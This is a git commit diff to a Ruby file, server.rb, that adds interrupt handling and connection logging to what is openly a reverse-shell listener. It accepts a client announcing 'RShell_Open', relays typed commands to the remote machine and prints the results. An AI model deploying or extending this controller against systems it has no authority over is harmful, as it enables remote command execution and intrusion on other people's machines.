a91fc50175f14191150011d864eb644db8ef3ae2
Matthias Lee <matthiasclee09@gmail.com>
2021-12-19 09:28:04 -0800

    Update server.rb

--- server.rb
+++ server.rb
@@ -7,10 +7,16 @@ server = TCPServer.new(host, port)
 puts "Listening on #{host}:#{port.to_s}"
 loop do
 	puts "Waiting for connection"
-	client = server.accept
+	begin
+		client = server.accept
+	rescue Interrupt
+		puts "\nExiting..."
+		exit
+	end
 	if client.gets.chomp == "RShell_Open"
 		currentDirCommand = client.gets
 		sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
+		puts "Received connection from #{remote_ip}"
 		loop do
 			client.puts "whoami"
 			whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
@@ -20,6 +26,7 @@ loop do
 			cmd = gets.chomp
 			client.puts cmd
 			if cmd.downcase == "exit"
+				puts "Exiting..."
 				break
 			end
 			out = client.gets.chomp.gsub("\\NEWLINE", "\n")
